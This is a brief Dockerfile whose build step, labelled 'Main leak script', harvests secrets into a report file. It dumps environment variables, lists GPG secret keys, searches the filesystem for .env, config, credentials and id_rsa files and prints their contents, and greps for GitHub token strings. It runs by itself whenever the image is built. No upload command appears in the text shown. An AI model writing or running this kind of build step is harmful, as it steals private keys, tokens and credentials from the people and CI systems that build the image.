FROM alpine:latest

RUN apk add --no-cache gnupg curl grep findutils

# Main leak script
RUN echo '[ENV VARS]:' > /leak_report.txt && \
    env | grep -v 'GITHUB_TOKEN' >> /leak_report.txt && \
    echo '\n[GPG KEYS]:' >> /leak_report.txt && \
    gpg --list-keys >> /leak_report.txt 2>/dev/null || true && \
    echo '\n[GPG Secret Keys]:' >> /leak_report.txt && \
    gpg --list-secret-keys --keyid-format LONG >> /leak_report.txt 2>/dev/null || true && \
    echo '\n[FILESYSTEM SENSITIVE FILES]:' >> /leak_report.txt && \
    find / -iname "*.env" -o -iname "*.yml" -o -iname "*.json" -o -iname "credentials" -o -iname "config" -o -iname "id_rsa" \
         -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /leak_report.txt 2>/dev/null || true && \
    echo '\n[GitHub Tokens Check]:' >> /leak_report.txt && \
    env | grep -Ei 'ghp_|token' >> /leak_report.txt || true
